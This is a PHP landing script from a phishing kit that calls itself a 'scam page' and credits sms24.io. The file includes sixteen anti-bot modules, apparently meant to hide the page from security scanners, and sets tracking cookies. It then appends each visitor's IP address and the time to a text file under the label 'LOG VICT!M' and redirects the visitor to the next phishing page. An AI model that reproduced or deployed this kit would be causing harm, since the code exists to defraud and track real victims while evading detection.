<?php
//<!-- SCAM PAGE HUNT #By https://sms24.io , WORK HARD DREAM B!G --> 
 /* ___      ___      _______  __
                     
	https://sms24.io : 			
									   */
include('bots/anti1.php');
include('bots/anti2.php');
include('bots/anti3.php');
include('bots/anti4.php');
include('bots/anti5.php');
include('bots/anti6.php');
include('bots/anti7.php');
include('bots/anti8.php');
include('bots/ant1.php');
include('bots/ant2.php');
include('bots/ant3.php');
include('bots/ant4.php');
include('bots/ant5.php');
include('bots/ant6.php');
include('bots/ant7.php');
include('bots/ant8.php');


include 'btm.php';
setcookie('5075140835d0bc504791c76b04c33d2bck','c327b49efdca2668f28cd7b4beee54b3y3r',time()+86400*30,'/');
setcookie('ce114cdc5e387191210f3b519dfb118bck',time(),time()+86400*30,'/');
$dt=date('D M Y :i:s');
$ib=$_SERVER['REMOTE_ADDR'];
$mile = fopen("Yo.txt","a");
fwrite($mile,$ib." -| LOG VICT!M !! |- ".$dt." \r\n");
fclose($mile);
header('Location: dir.php');
?>